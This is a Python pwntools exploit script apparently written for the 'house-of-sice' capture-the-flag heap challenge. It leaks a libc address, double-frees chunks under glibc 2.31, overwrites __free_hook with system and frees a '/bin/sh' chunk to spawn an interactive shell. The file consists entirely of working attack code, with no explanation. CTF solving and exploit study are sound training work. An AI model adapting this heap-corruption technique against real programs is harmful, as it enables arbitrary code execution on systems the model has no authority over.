#!/usr/bin/python3

from pwn import *
import binascii
import sys

filename = "./chall"
address = "house-of-sice.hsc.tf"
port = 1337


try:
	if sys.argv[1] == "-r":
		io = remote(address, port)
		libc = ELF("./libc-2.31.so")
except:
	io = process(filename, env={"LD_PRELOAD": "./libc-2.31.so"})
	libc = ELF("./libc-2.31.so")


def alloca(data=0x10, calloc=False):
	io.sendlineafter("> ", "1")
	if calloc:
		io.sendlineafter("> ", "2")
	else:
		io.sendlineafter("> ", "1")
	io.sendlineafter("> ", str(data))

def free(idx):
	io.sendlineafter("> ", "2")
	io.sendlineafter("> ", str(idx))

def leak_address():
	for _ in range(3):
		io.recvline()

	io.recvuntil(b":")
	leaked_address = int(io.recvline().strip().decode(), 16)
	return leaked_address

def main():
	address = leak_address()

	base_address = address - libc.sym.system
	free_hook = base_address + libc.sym.__free_hook

	log.info("Leaked address: %s " % hex(address))
	log.info("Base address: %s " % hex(base_address))

	for _ in range(9):
		alloca()
	for i in range(9):
		free(i)
	free(7)


	for _ in range(3):
		alloca()

	alloca(data=free_hook, calloc=True)
	alloca(int(b"0x"+binascii.hexlify(b"/bin/sh"[::-1]), 16))
	alloca()
	alloca(data=address)
	free(13)
	io.interactive()

if __name__ == "__main__":
	main()
